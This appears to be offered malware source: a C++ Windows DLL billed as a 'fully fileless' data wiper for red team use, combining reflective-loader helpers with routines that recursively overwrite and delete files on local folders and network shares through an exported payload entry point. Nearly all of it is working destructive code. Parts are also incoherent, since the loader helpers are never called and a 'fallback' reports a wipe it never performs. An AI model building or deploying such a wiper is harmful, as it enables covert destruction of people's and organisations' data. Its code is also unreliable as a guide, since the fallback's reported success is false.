
// Fully fileless secure data wiper with manual DLL reflective loader internals (red team use only)

#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <filesystem>
#include <memory>

#pragma comment(lib, "Shlwapi.lib")

// ---------------- Reflective Loader Helpers ----------------

bool PerformBaseRelocations(BYTE* baseAddress, SIZE_T delta) {
    if (delta == 0) return true;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(baseAddress + dosHeader->e_lfanew);

    auto& dir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir.Size == 0) return true;

    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(baseAddress + dir.VirtualAddress);
    SIZE_T maxSize = dir.Size;
    SIZE_T processed = 0;

    while (processed < maxSize && relocation->SizeOfBlock) {
        DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)(relocation + 1);

        for (DWORD i = 0; i < count; i++) {
            WORD typeOffset = list[i];
            WORD type = (typeOffset >> 12) & 0xF;
            WORD offset = typeOffset & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                UINT64* patchAddr = (UINT64*)(baseAddress + relocation->VirtualAddress + offset);
                *patchAddr += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patchAddr = (DWORD*)(baseAddress + relocation->VirtualAddress + offset);
                *patchAddr += (DWORD)delta;
            }
        }

        processed += relocation->SizeOfBlock;
        relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
    }
    return true;
}

bool ResolveImports(BYTE* baseAddress) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(baseAddress + dosHeader->e_lfanew);

    auto& dir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir.Size == 0) return true;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + dir.VirtualAddress);

    while (importDesc->Name) {
        const char* dllName = (const char*)(baseAddress + importDesc->Name);
        HMODULE moduleHandle = LoadLibraryA(dllName);
        if (!moduleHandle) return false;

        PIMAGE_THUNK_DATA64 thunkOrig = (PIMAGE_THUNK_DATA64)(baseAddress + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 thunkIAT = (PIMAGE_THUNK_DATA64)(baseAddress + importDesc->FirstThunk);

        if (!thunkOrig) thunkOrig = thunkIAT;

        while (thunkOrig->u1.AddressOfData) {
            FARPROC funcAddress = NULL;

            if (thunkOrig->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                WORD ordinal = (WORD)(thunkOrig->u1.Ordinal & 0xFFFF);
                funcAddress = GetProcAddress(moduleHandle, (LPCSTR)ordinal);
            } else {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(baseAddress + thunkOrig->u1.AddressOfData);
                funcAddress = GetProcAddress(moduleHandle, importByName->Name);
            }

            if (!funcAddress) return false;

            thunkIAT->u1.Function = (ULONGLONG)funcAddress;

            ++thunkOrig;
            ++thunkIAT;
        }

        ++importDesc;
    }
    return true;
}

// Reflective loader main function
extern "C" __declspec(dllexport) BOOL RunReflectivePayload();

// ---------------- Secure Data Wiper (nsfw.dll core) ----------------

// Secure file wipe function
bool SecureWipeFile(const std::wstring& filePath, int passes) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
        CloseHandle(hFile);
        return false;
    }

    std::unique_ptr<BYTE[]> buffer(new BYTE[(size_t)fileSize.QuadPart]);
    DWORD written = 0;

    for (int p = 0; p < passes; ++p) {
        for (LONGLONG i = 0; i < fileSize.QuadPart; ++i)
            buffer[i] = static_cast<BYTE>(rand() % 256);

        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, buffer.get(), (DWORD)fileSize.QuadPart, &written, NULL);
        FlushFileBuffers(hFile);
    }

    CloseHandle(hFile);
    return DeleteFileW(filePath.c_str());
}

// Recursive directory wipe
void WipeDirectory(const std::wstring& dirPath, int passes) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(
        dirPath, std::filesystem::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            SecureWipeFile(entry.path().wstring(), passes);
        }
    }
}

bool IsNetworkPath(const std::wstring& path) {
    return PathIsNetworkPathW(path.c_str());
}

void SimulateLogEvent(const std::wstring& filePath) {
    OutputDebugStringW((L"[WIPED] " + filePath + L"\n").c_str());
}

bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    std::unique_ptr<BYTE[]> dummy(new BYTE[(size_t)fileSize.QuadPart]);
    for (int i = 0; i < passes; ++i)
        for (LONGLONG j = 0; j < fileSize.QuadPart; ++j)
            dummy[j] = rand() % 256;

    return true; // Simulated overwrite
}

bool SecureWipeFileExtended(const std::wstring& filePath, int passes) {
    if (SecureWipeFile(filePath, passes)) {
        SimulateLogEvent(filePath);
        return true;
    }
    else {
        TryMemoryOverwriteFallback(filePath, passes);
        return false;
    }
}

void WipeNetworkPath(const std::wstring& networkPath, int passes) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(
        networkPath, std::filesystem::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            SecureWipeFileExtended(entry.path().wstring(), passes);
        }
    }
}

// Reflective entry point function
extern "C" __declspec(dllexport) BOOL RunReflectivePayload() {
    // Example: wipe "C:\\SensitiveData" recursively with 3 passes (change as needed)
    const wchar_t* target = L"C:\\SensitiveData";
    int passes = 3;

    DWORD attr = GetFileAttributesW(target);
    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;

    if (IsNetworkPath(target)) {
        WipeNetworkPath(target, passes);
    }
    else if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        WipeDirectory(target, passes);
    }
    else {
        SecureWipeFileExtended(target, passes);
    }

    return TRUE;
}

// Dummy DllMain to satisfy linker
BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) {
    return TRUE;
}
